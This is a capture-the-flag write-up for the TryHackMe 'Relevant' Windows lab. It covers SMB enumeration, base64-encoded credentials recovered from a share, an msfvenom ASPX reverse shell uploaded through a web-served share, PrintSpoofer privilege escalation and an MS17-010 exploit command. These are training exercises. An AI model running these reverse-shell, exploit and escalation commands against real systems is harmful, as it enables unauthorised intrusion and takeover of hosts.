# Relevant Writeup

> IP 10.10.205.1

```bash
**# Nmap 7.94SVN scan initiated Fri Feb  2 18:47:45 2024 as: nmap -sCV --min-rate=10000 -p- -v -T4 -oN nmap/allscan.txt -Pn 10.10.205.1**
Nmap scan report for 10.10.205.1
Host is up (0.25s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-02-02T13:19:49+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2024-02-02T13:19:11+00:00
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-01T12:57:49
| Not valid after:  2024-08-02T12:57:49
| MD5:   0f81:f19d:a28b:6086:d48a:1097:f4fa:c236
|_SHA-1: 0d49:3925:bdf8:dee0:4814:5e85:12c2:5fa3:4a0d:38c9
49663/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Microsoft-IIS/10.0
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h36m00s, deviation: 3h34m40s, median: 0s
| smb2-time: 
|   date: 2024-02-02T13:19:17
|_  start_date: 2024-02-02T12:58:50
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-02-02T05:19:09-08:00

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb  2 18:49:50 2024 -- 1 IP address (1 host up) scanned in 125.45 seconds

```

port 49663 is http windows server default page lets run gobuster in background and then we will take a look smb ports

> SMB EMUN

```smbclient
smbclient -L //10.10.205.1/   
Password for [WORKGROUP\kr4zy]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.205.1 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

there nt4wrksv is odd then other lets get into it and see is there any information we will get into system

```
smbclient  //10.10.205.1/nt4wrksv       
Password for [WORKGROUP\kr4zy]:
Try "help" to get a list of possible commands.
smb: \> ls 
  .                                   D        0  Sun Jul 26 03:16:04 2020
  ..                                  D        0  Sun Jul 26 03:16:04 2020
  passwords.txt                       A       98  Sat Jul 25 20:45:33 2020

		7735807 blocks of size 4096. 4943044 blocks available
smb: \> 

```

we can see a password file is present in the smbshares

> passwords.txt

```
9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk   
```

Decoded txt

```
Bob - !P@$$W0rD!123 
Bill - Juw4nnaM4n420696969!$$$
```

these password can be used for login in the server

lets try to login to rdp port which is open in nmap scan

no there is no use in rdp as of now

maybe lets see gobuster directories

gobuster didn't gave us a valid , which makes this interesting

maybe smb shares is connected to the website like some sites ftp is connected

we found `nt4wrksv` in the smb share ,lets see by sending a curl request both port we found

Port 80 didnt give us a response , port 49663 gave us response

```bash
curl -i http://10.10.205.1:49663/nt4wrksv/passwords.txt
HTTP/1.1 200 OK
Content-Type: text/plain
Last-Modified: Sat, 25 Jul 2020 15:15:33 GMT
Accept-Ranges: bytes
ETag: "65e151719662d61:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Fri, 02 Feb 2024 13:46:29 GMT
Content-Length: 98

[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk  
```

no lets try to put a file in smb shares

we create a file name `hellofriend.txt` and successfully we can even put the file in that directory

```
curl -i http://10.10.205.1:49663/nt4wrksv/hellofriend.txt
HTTP/1.1 200 OK
Content-Type: text/plain
Last-Modified: Fri, 02 Feb 2024 13:50:15 GMT
Accept-Ranges: bytes
ETag: "668c46c0de55da1:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Fri, 02 Feb 2024 13:52:20 GMT
Content-Length: 31

hello your computer has virus 

```

we have successfully got the response from the website too

As the Relevant Main page(in tryhackme) it says we dont have use metasploitable

**But there is way we can use with it lets see possible way we can get privesc**

But as of now we will use normal way now it's time to put a reverse shell in smbshares

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=port —platform windows -a x64 -f aspx -o ok.aspx`

```html
smb: \> put ok.aspx 
putting file ok.aspx as \ok.aspx (1.8 kb/s) (average 1.5 kb/s)
smb: \> ls
  .                                   D        0  Fri Feb  2 19:41:46 2024
  ..                                  D        0  Fri Feb  2 19:41:46 2024
  ok.aspx                             A     3401  Fri Feb  2 19:42:14 2024
  passwords.txt                       A       98  Sat Jul 25 20:45:33 2020

		7735807 blocks of size 4096. 4922489 blocks available
smb: \> exit 

```

Now let do a curl request to the file

`http://10.10.205.1:49663/nt4wrksv/ok.aspx`

> Response

```
nc -nlvp 9001 
listening on [any] 9001 ...
connect to [10.8.28.252] from (UNKNOWN) [10.10.19.246] 49736
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

```

now we got the user shell (i guess)

now go to `c:\Users\Bob\Desktop>`

and grab the user.txt

Now it time for root privesc . lets see

```
c:\Users\Public>whoami /priv 
whoami /priv 

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

c:\Users\Public>

```

As we can see there is `SeImpersonatePrivilege` so we can use printspoofer.exe to get privesc

```
smbclient  //10.10.19.246/nt4wrksv/ -N 
Try "help" to get a list of possible commands.
smb: \> put PrintSpoofer.exe 
putting file PrintSpoofer.exe as \PrintSpoofer.exe (21.4 kb/s) (average 21.4 kb/s)
smb: \> 

```

```powershell
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```

Now lets grab the root shell

### Method 2

```bash
nmap --script=vuln -p 139,445 10.10.19.246 -v --oN nmap/vuln.txt


PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)

NSE: Script Post-scanning.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 29.80 seconds

```

It's ms17-010 exploit

we can find

exploit we are going to use : https://github.com/3ndG4me/AutoBlue-MS17-010

`python zzz_exploit.py -target-ip 10.10.19.246 -port 445 'Bob:!P@$$W0rD!123'`

```powershell

C:\Windows\system32>whoami
whoami
nt authority\system
```

> Meterpreter shell

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.8.28.252 LPORT=9001 -a x64 -f aspx -o reverse.aspx
```

Then Everything in the method 1 is same to get the root and user privesc .
